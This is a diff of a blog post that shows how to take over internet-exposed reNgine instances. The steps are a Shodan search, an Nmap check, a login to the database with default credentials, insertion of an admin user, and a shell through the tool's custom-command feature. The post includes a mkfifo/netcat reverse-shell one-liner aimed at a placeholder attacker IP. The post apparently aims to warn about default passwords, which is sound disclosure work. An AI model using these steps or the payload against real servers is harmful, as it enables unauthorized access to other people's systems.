@@ -5,8 +5,15 @@ date: 2022-06-17 00:00:00 +0530
 background: '/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/thumbnail.png'
 ---
 
+<style>
+    p {
+        text-align: justify;
+        text-justify: inter-word;
+    }
+</style>
+
 </div>
-<p class="has-text-align-justify">reNgine is an automated reconnaissance framework for web applications. By default, it
+<p>reNgine is an automated reconnaissance framework for web applications. By default, it
     uses port <code>443</code> for the graphical user interface and port <code>5432</code> for database. The default
     configuration for the database is set on an .env file in the project. This means if anyone does not modify default
     passwords and expose the port, we can achieve a reverse shell. This is how it works:</p>
@@ -20,13 +27,13 @@ background: '/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/thumbnail
     src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/1.shodan%20search.png"
     alt="" width="562" height="180" />
 <p></p>
-<p class="has-text-align-justify">Let's perform a Shodan search. We discover 500+ instances of reNgine installed on VPS
+<p>Let's perform a Shodan search. We discover 500+ instances of reNgine installed on VPS
     and many of them have port 5432 open.</p>
 <br>
 <img src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/3.%20nmap%20check.png" alt="" width="522"
     height="140" />
 <p></p>
-<p class="has-text-align-justify">Let's perform an Nmap scan to verify that the port is open. And yes, we find that the
+<p>Let's perform an Nmap scan to verify that the port is open. And yes, we find that the
     port is indeed open.</p>
 <br>
 <img
@@ -34,10 +41,10 @@ background: '/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/thumbnail
     alt="" width="358" height="112" />
 
 <p></p>
-<p class="has-text-align-justify">Now, it is time to test if they are using the default credentials. So, we try to
+<p>Now, it is time to test if they are using the default credentials. So, we try to
     connect to the database with the default credential and we succeed. Now? </p>
 <br>
-<p class="has-text-align-justify">The database has all the information you see on the reNgine dashboard, stored in
+<p>The database has all the information you see on the reNgine dashboard, stored in
     different tables. Among the tables is <strong><em><code>auth_user</code></em> </strong>table which stores the login
     credentials for reNgine. If we view the data in the table, we can see useful information such as username and
     password that provides access to the reNgine dashboard. However, the password is encrypted. </p>
@@ -45,29 +52,27 @@ background: '/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/thumbnail
     src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/7.%20login%20user%20default.png"
     alt="" />
 
-<p class="has-text-align-justify">As reNgine is an open source project, we know how the hashing works here and maybe we
+<p>As reNgine is an open source project, we know how the hashing works here and maybe we
     can try to use rainbow tables to crack the password. But, we also have a better option. We can insert a new login
     credentials into the table and use that to login instead of spending time on cracking the existing password. Let's
     add a user named 'info' with password '<em><strong>qazwsx</strong></em>' which is encrypted using the same hashing
     algorithm that the reNgine uses. </p>
-<img
-    src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/8.%20user%20insert.png"
-    alt="" width="840" height="96" />
+<img src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/8.%20user%20insert.png" alt="" width="840" height="96" />
 
-<p class="has-text-align-justify">If we see the data from the table again, we can see a new user has been added with
+<p>If we see the data from the table again, we can see a new user has been added with
     highest level of privileges.</p>
-<p class="has-text-align-justify">Now, we can login to the reNgine dashboard with the new credentials.</p>
+<p>Now, we can login to the reNgine dashboard with the new credentials.</p>
 <img
     src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/10.%20logging%20in.png"
     alt="" width="354" height="355" />
 
-<p class="has-text-align-justify">Can we do more? Yes, we can. We can use one of the intended feature of reNgine to get
+<p>Can we do more? Yes, we can. We can use one of the intended feature of reNgine to get
     shell access to the container. The feature we are leveraging here is the "Tools Arsenal" section. We can add a
     custom tool in reNgine and give commands to execute. We add a custom tool with the following line in the update
     command:</p>
 <pre
     <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ATTACKER_IP&gt; &lt;ATTACKER PORT&gt; &gt;/tmp/f</code></pre>
-<p class="has-text-align-justify">Then, listen for an incoming connection and click on "Check Update" button for the
+<p>Then, listen for an incoming connection and click on "Check Update" button for the
     custom tool. We have a shell access now. This in itself is not a vulnerability in reNgine but an intended feature.
     Here is a walkthrough video to get the reverse shell.</p>
 <center><iframe width="780" height="438" src="https://www.youtube.com/embed/po7fUeXY-Ww" title="reNgine shell access"
